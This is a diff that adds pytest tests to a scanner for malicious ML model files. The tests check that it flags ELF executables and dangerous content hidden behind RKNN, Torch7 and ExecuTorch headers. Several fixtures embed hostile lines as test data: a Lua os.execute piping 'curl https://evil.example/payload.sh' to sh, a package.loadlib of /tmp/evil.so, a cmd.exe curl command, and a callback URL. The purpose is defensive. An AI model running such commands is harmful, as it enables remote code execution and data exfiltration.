@@ -1875,6 +1875,121 @@ def test_scan_file_routes_raw_bin_without_zip_structure_to_pytorch_binary(tmp_pa
     assert result.success is True
 
 
+@pytest.mark.parametrize(
+    ("payload", "supplemental_scanner"),
+    [
+        (b"RKNN\x01\x00\x00\x00payload" + b"\x7fELF" + b"\x00" * 128, "rknn"),
+        (b"T7\x00\x00payload torch.FloatTensor nn.Sequential " + b"\x7fELF" + b"\x00" * 128, "torch7"),
+        (b"\x0c\x00\x00\x00ET13\x04\x00\x04\x00\x04\x00\x00\x00" + b"\x7fELF" + b"\x00" * 128, "executorch"),
+    ],
+    ids=["rknn", "torch7", "executorch"],
+)
+def test_scan_file_preserves_bin_executable_detection_when_prefix_looks_like_other_format(
+    tmp_path: Path,
+    payload: bytes,
+    supplemental_scanner: str,
+) -> None:
+    model_path = tmp_path / "weights.bin"
+    model_path.write_bytes(payload)
+
+    result = scan_file(str(model_path), config={"cache_scan_results": False})
+
+    assert file_detection.detect_file_format(str(model_path)) == "pytorch_binary"
+    assert result.scanner_name == "pytorch_binary"
+    assert result.metadata["supplemental_scanners"] == [supplemental_scanner]
+    assert any("Linux executable" in issue.message for issue in result.issues)
+
+
+def test_scan_file_merges_torch7_security_analysis_for_signature_valid_bin(tmp_path: Path) -> None:
+    model_path = tmp_path / "payload.bin"
+    model_path.write_bytes(
+        b"T7\x00\x00torch.FloatTensor nn.Sequential\n"
+        b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+        b"local lib = package.loadlib('/tmp/evil.so', 'run')\n"
+        b"\x7fELF" + b"\x00" * 128
+    )
+
+    result = scan_file(str(model_path), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "pytorch_binary"
+    assert result.metadata["supplemental_scanners"] == ["torch7"]
+    assert any("Linux executable" in issue.message for issue in result.issues)
+    assert any(
+        check.name == "Torch7 Lua Execution Primitive Analysis"
+        and check.status == CheckStatus.FAILED
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize(
+    "selection_config",
+    [
+        {"exclude_scanners": ["pytorch_binary"]},
+        {"scanners": ["torch7"]},
+    ],
+    ids=["pytorch-binary-excluded", "torch7-only"],
+)
+def test_scan_file_routes_malicious_torch7_bin_when_raw_scanner_is_suppressed(
+    tmp_path: Path,
+    selection_config: dict[str, list[str]],
+) -> None:
+    model_path = tmp_path / "payload.bin"
+    model_path.write_bytes(
+        b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+    )
+
+    result = scan_file(
+        str(model_path),
+        config={**selection_config, "cache_scan_results": False},
+    )
+
+    assert result.scanner_name == "torch7"
+    assert any(
+        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "pytorch_binary"
+        for check in result.checks
+    )
+    assert any(
+        check.name == "Torch7 Lua Execution Primitive Analysis"
+        and check.status == CheckStatus.FAILED
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+def test_scan_file_merges_rknn_security_analysis_for_signature_valid_bin(tmp_path: Path) -> None:
+    model_path = tmp_path / "payload.bin"
+    model_path.write_bytes(
+        b"RKNN\x01\x00\x00\x00"
+        b"notes=cmd.exe /c curl https://evil.example/payload\n"
+        b"callback=http://198.51.100.5:8080/collect\n"
+    )
+
+    result = scan_file(str(model_path), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "pytorch_binary"
+    assert result.metadata["supplemental_scanners"] == ["rknn"]
+    assert any(
+        check.name == "RKNN Command and Network Indicator Correlation"
+        and check.status == CheckStatus.FAILED
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+def test_scan_file_merges_executorch_archive_analysis_for_signature_valid_bin(tmp_path: Path) -> None:
+    model_path = tmp_path / "program.bin"
+    model_path.write_bytes(b"\x0c\x00\x00\x00ET13\x04\x00\x04\x00\x04\x00\x00\x00")
+    with zipfile.ZipFile(model_path, "a") as archive:
+        archive.writestr("evil.py", "print('evil')")
+
+    result = scan_file(str(model_path), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "pytorch_binary"
+    assert result.metadata["supplemental_scanners"] == ["executorch"]
+    assert any(issue.rule_code == "S104" and "evil.py" in (issue.location or "") for issue in result.issues)
+
+
 def test_preferred_scanner_does_not_route_generic_zip_bin_to_pickle(tmp_path: Path) -> None:
     model_path = tmp_path / "weights.bin"
     _create_misnamed_zip(model_path, {"metadata.txt": b"not a pickle"})
